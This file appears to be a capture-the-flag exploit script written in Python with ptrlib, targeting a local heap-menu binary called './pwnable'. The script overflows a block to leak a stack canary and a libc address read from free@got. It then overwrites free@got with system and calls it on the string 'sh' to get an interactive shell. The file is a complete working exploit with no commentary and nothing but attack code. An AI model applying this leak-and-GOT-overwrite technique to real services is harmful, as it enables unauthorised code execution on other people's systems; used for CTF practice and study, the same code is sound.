from ptrlib import *
from time import sleep

def create_block(size):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size:")
    sock.sendline(str(size))

def print_block(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index:")
    sock.sendline(str(index))
    sock.recvline()
    return sock.recvline().rstrip()

def write_block(index, size, data):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("index:")
    sock.sendline(str(index))
    sock.recvuntil("size:")
    sock.sendline(str(size))
    sleep(0.1)
    sock.send(data)

elf = ELF("./pwnable")

#libc = ELF("./libc-2.23.so")
#libc_one_gadget = 0x4526a

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_one_gadget = 0x4f2c5
sock = Process("./pwnable")

# leak canary for id=0
create_block(0x20) # 0
payload = b'A' * 0x20
payload += p64(0x30) # size
write_block(0, len(payload), payload)
canary = print_block(0)[0x28:0x30]
dump(b"canary[0] = " + canary)

# leak libc base
payload = b'A' * 0x20
payload += p64(0x8) # size
payload += canary
payload += p64(elf.got("free"))
write_block(0, len(payload), payload)
addr_puts = u64(print_block(0))
libc_base = addr_puts - libc.symbol("free")
dump("libc base = " + hex(libc_base))
#addr_one_gadget = libc_base + libc_one_gadget

# write <system> to free@got
write_block(0, 8, p64(libc_base + libc.symbol("system")))

# get the shell
create_block(u16("sh"))

sock.interactive()
